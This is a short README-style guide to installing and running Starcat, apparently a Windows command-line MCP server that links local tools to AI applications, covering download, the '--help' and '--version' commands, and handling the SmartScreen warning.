🐱 What is Starcat?

Starcat serves as a bridge for your computer to connect with modern AI agents. It acts as a command center. You use it to run local tools that help your AI perform tasks. If you use AI assistants to organize files, manage projects, or fetch data, Starcat handles the technical connections for you.

It works on Windows, Linux, and MacOS. This document focuses on the setup process for Windows users.

⚙️ System Requirements

  • Windows 10 or 11 running the 64-bit version.
  • An active internet connection to verify your AI server settings.
  • Basic familiarity with your Windows Command Prompt or PowerShell.

📥 Installation Steps

Follow these steps to set up Starcat on your machine:

  1. Visit the official download page.
  2. Look for the section labeled "Assets" under the most recent version.
  3. Find the file that ends in .exe for Windows.
  4. Click the filename to start the download.
  5. Move the downloaded file to a folder where you keep your tools.

🚀 Running Starcat

Once you finish the download, you must run the program through your terminal.

  1. Open the folder where you saved the file.
  2. Right-click inside the folder while holding the Shift key. Choose "Open PowerShell window here" or "Open in Terminal."
  3. Type .\starcat-cli.exe --help into the window and press Enter.
  4. The system shows a list of available commands. This confirms that the program works correctly.

🛠️ Common Usage

Starcat functions as an MCP server. This means it shares data with your AI applications to give them access to local files or specific services. When your AI application asks for an MCP server address, you point it toward the Starcat configuration file. You do not need to keep the terminal window open once you establish the connection.

You can check the current version of the software anytime by running .\starcat-cli.exe --version.

❓ Troubleshooting

If Windows prevents the program from starting, you may see a "Protected your PC" message. If you trust the source, click "More info" and then "Run anyway." This happens because the file is new and your security settings track file reputation for safety.

Ensure you place the file in a folder that your user account has permission to access. Avoid placing the file inside restricted system folders like "C:\Windows" or "C:\Program Files" unless you plan to configure global access permissions.
